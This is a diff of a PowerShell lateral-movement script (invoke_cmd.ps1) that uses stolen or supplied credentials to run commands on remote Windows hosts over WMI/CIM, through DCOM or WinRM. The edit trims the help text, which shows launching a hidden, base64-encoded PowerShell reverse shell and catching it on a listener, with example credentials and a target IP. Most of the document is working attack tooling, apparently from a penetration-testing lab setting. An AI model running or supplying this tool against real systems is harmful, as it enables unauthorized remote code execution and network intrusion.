@@ -1,45 +1,7 @@
-<#
-.SYNOPSIS
-    Spawn a process on a remote Windows host over WMI using a CIM session.
-    Living-off-the-land lateral movement — native PowerShell, no impacket.
-
-.DESCRIPTION
-    Builds a credential object, opens a CIM session to the target (DCOM by
-    default, WinRM optional), and calls Win32_Process.Create to run a command
-    on the remote host in the supplied user's context.
-
-    IMPORTANT — run this FROM A WINDOWS FOOTHOLD, not from Kali.
-    DCOM is a Windows-only transport; pwsh on Linux cannot use -Protocol DCOM.
-    From Kali, use:  impacket-wmiexec domain/user:'pass'@<target>
-
-    Win32_Process.Create is fire-and-forget: it returns a ProcessId and a
-    ReturnValue, NOT the command's output. Pair it with a reverse shell and
-    catch the callback on your listener — do not expect output here.
-
-.PARAMETER Target
-    Remote host IP or hostname. The supplied user must be local admin on it.
-
-.PARAMETER Username
-    User to authenticate as. DOMAIN\user or user (resolved against target domain).
-
-.PARAMETER Password
-    Cleartext password for Username.
-
-.PARAMETER Command
-    Command line to run on the target. Typically:
-      powershell -nop -w hidden -e <BASE64_UTF16LE_REVSHELL>
-
-.PARAMETER Protocol
-    DCOM (default, port 135 — use when WinRM/5985 is filtered) or Wsman (WinRM).
-
-.EXAMPLE
-    .\invoke_cmd.ps1 -Target 192.168.50.73 -Username jen -Password 'Nexus123!' `
-        -Command 'powershell -nop -w hidden -e JABjAGwAaQBl...'
-
-.EXAMPLE
-    # Force WinRM transport instead of DCOM
-    .\invoke_cmd.ps1 -Target dc1 -Username admin -Password 'P@ss' -Command 'calc.exe' -Protocol Wsman
-#>
+# invoke_cmd.ps1 - CIM/DCOM lateral movement via Win32_Process.Create
+# Usage: .\invoke_cmd.ps1 -Target <ip> -Username <user> -Password '<pass>' -Command '<cmd>'
+#        add -Protocol Wsman to use WinRM instead of DCOM (default)
+# Fire-and-forget: spawns the process as <user>, no output returns - catch the shell on your listener.
 
 [CmdletBinding()]
 param(
@@ -50,10 +12,10 @@ param(
     [ValidateSet('DCOM', 'Wsman')] [string] $Protocol = 'DCOM'
 )
 
-# Win32_Process.Create return codes — decode the common ones so a non-zero
+# Win32_Process.Create return codes - decode the common ones so a non-zero
 # result tells you WHY rather than leaving you guessing.
 $ReturnCodes = @{
-    0  = 'Success — process spawned'
+    0  = 'Success - process spawned'
     2  = 'Access denied (creds are not admin on the target?)'
     3  = 'Insufficient privilege'
     8  = 'Unknown failure'
@@ -87,10 +49,10 @@ try {
 
     if ($rv -eq 0) {
         Write-Host "[+] Process spawned. PID: $($Result.ProcessId)" -ForegroundColor Green
-        Write-Host "[!] NOTE: output does NOT return here — check your listener for the shell." -ForegroundColor Yellow
+        Write-Host "[!] NOTE: output does NOT return here - check your listener for the shell." -ForegroundColor Yellow
     }
     else {
-        Write-Host "[!] Create returned $rv — $meaning" -ForegroundColor Red
+        Write-Host "[!] Create returned $rv - $meaning" -ForegroundColor Red
         Write-Host "[!] No process was spawned." -ForegroundColor Red
     }
 }
